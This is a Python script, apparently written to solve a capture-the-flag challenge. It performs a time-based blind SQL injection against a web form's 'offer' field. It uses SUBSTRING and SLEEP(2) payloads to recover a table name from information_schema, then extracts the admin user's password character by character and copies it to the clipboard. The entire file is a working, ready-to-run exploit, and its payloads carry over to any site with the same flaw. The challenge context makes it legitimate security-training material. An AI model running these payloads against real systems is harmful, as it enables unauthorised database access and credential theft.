#!/usr/bin/env python3

import pyclip
import binascii
import requests
import string


def string_to_hex(input_string):
    '''
    Convert a string to its hexadecimal representation
    the same way that sqlite3 HEX() function does.
    '''
    encoded_bytes = input_string.encode('utf-8')

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')

    return hex_representation.upper()


# Your cookies here
cookies = {
    'session': '',
}

# A session object to keep track of cookies
browser = requests.Session()

# The target URL
url = 'http://cyberchallenge.disi.unitn.it:50050/product/1'


secret = ''
table = ''
found_table = False
found_pass = False
i=1 #index of the character that is being evaluated
while not found_table:
    for character in string.printable:
        if found_table:
            break
        
        '''
        The query checks if a character at a specific index in the second table name obtained from the current database schema matches a given character.
        If there is a match, the code introduces a delay of 2 seconds using the SLEEP function.
        '''
        injection = f"19399 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1,1),{i},1)='{character}', SLEEP(2), null)"
        

        ################# POST Request #################
        data = {
            'offer': injection
        }
        response = browser.post(url, cookies=cookies, data=data, allow_redirects=False)
        time = response.elapsed.seconds


        if response.status_code == 302:
            # follow redirection
            if 'Location' in response.headers and response.headers['Location'].startswith('/'):
                _url = url.replace('/product/1', response.headers['Location'])
            else:
                _url = response.headers['Location']
            response = browser.get(_url, cookies=cookies, allow_redirects=False)

            # If the response comes after two seconds, it means that the query is correct and a character has been found
            if time >= 2:
                if character == ' ':
                    found_table=True
                    print(f"Found table: {table}\n")
                    break
                table += character
                i+=1
                print(f'New table character found ({character}): {table}\n')
                break
    if not table:
        break

i=1 #index of the character that is being evaluated
while not found_pass:
    for character in string.printable:
        if found_pass:
            break
        '''
        This code snippet consists of an IF statement that checks if a character in the password of the 'admin' user matches a given hexadecimal value.
        It uses the HEX function to convert the character at position i in the password to its hexadecimal representation.
        If the hexadecimal representation matches the specified string_to_hex(character),
        the code will introduce a delay of 2 seconds using the SLEEP function; otherwise, it will do nothing.
        '''
        injection = f"19399 AND IF(HEX(SUBSTRING((SELECT password FROM {table} WHERE username='admin'),{i},1))='{string_to_hex(character)}', SLEEP(2), null)"


        ################# POST Request #################
        data = {
            'offer': injection
        }
        response = browser.post(url, cookies=cookies, data=data, allow_redirects=False)
        time = response.elapsed.seconds
        # Follow the redirect
        if response.status_code == 302:
            # follow redirection
            if 'Location' in response.headers and response.headers['Location'].startswith('/'):
                _url = url.replace('/product/1', response.headers['Location'])
            else:
                _url = response.headers['Location']
            response = browser.get(_url, cookies=cookies, allow_redirects=False)

            # If the response comes after two seconds, it means that the query is correct and a character has been found
            if time >= 2:      
                if character == ' ': 
                    found_pass=True
                    break
                secret += character
                i+=1
                print(f'New character found ({character}): {secret}\n')
                break
    if not secret:
        break
            

if secret:
    pyclip.copy(secret)
    print(f'Secret copied in the clipboard: {secret}')
else:
    print("No password found")

exit(0)
